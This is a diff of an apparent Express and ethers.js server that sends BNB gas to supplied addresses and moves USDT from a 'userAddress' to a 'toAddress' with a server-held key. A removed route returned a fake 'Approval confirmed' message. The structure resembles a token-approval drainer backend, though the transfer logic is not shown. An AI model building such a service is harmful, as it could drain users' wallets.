@@ -32,7 +32,7 @@ const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
 
 /* =============================
-   USDT Contract (BSC)
+   USDT Contract
 ============================= */
 
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
@@ -52,27 +52,27 @@ app.get("/", (req, res) => {
 });
 
 /* =============================
-   1️⃣ FUND GAS (Send BNB)
+   TOPUP (Send BNB Gas)
 ============================= */
 
-app.post("/fund-gas", checkApiKey, async (req, res) => {
+app.post("/topup", checkApiKey, async (req, res) => {
   try {
 
-    const { userAddress } = req.body;
+    const { to } = req.body;
 
-    if (!userAddress)
+    if (!to)
       return res.status(400).json({ error: "Address required" });
 
     const tx = await wallet.sendTransaction({
-      to: userAddress,
-      value: ethers.parseEther("0.0005"),
+      to: to,
+      value: ethers.parseEther("0.0005")
     });
 
     await tx.wait();
 
     res.json({
       success: true,
-      hash: tx.hash,
+      hash: tx.hash
     });
 
   } catch (err) {
@@ -81,23 +81,10 @@ app.post("/fund-gas", checkApiKey, async (req, res) => {
 });
 
 /* =============================
-   2️⃣ TRANSFER SIGNAL
+   SEND (Transfer USDT)
 ============================= */
 
-app.post("/transfer", checkApiKey, async (req, res) => {
-
-  res.json({
-    success: true,
-    message: "Approval confirmed",
-  });
-
-});
-
-/* =============================
-   3️⃣ TRANSFER AMOUNT
-============================= */
-
-app.post("/transfer-amount", checkApiKey, async (req, res) => {
+app.post("/send", checkApiKey, async (req, res) => {
   try {
 
     const { userAddress, toAddress, amount } = req.body;
@@ -117,7 +104,33 @@ app.post("/transfer-amount", checkApiKey, async (req, res) => {
 
     res.json({
       success: true,
-      txHash: tx.hash,
+      txHash: tx.hash
+    });
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+/* =============================
+   FUND GAS (Optional)
+============================= */
+
+app.post("/fund-gas", checkApiKey, async (req, res) => {
+  try {
+
+    const { userAddress } = req.body;
+
+    const tx = await wallet.sendTransaction({
+      to: userAddress,
+      value: ethers.parseEther("0.0005")
+    });
+
+    await tx.wait();
+
+    res.json({
+      success: true,
+      hash: tx.hash
     });
 
   } catch (err) {
